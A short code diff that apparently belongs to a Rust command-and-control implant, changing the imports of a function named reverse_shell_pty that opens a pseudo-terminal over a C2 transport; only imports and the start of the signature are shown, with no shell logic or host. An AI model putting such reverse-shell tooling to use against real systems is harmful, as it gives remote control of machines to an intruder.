@@ -1,11 +1,13 @@
 use alloc::string::String;
 use alloc::sync::Arc;
-use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse};
+use pb::c2::{ReverseShellMessageKind, ReverseShellRequest};
 use portable_pty::{CommandBuilder, PtySize, native_pty_system};
 use std::io::{Read, Write};
 use std::sync::mpsc;
 use std::thread;
 use transport::SyncTransport;
+
+use anyhow::Result;
 
 pub fn reverse_shell_pty(
     transport: Arc<dyn SyncTransport>,
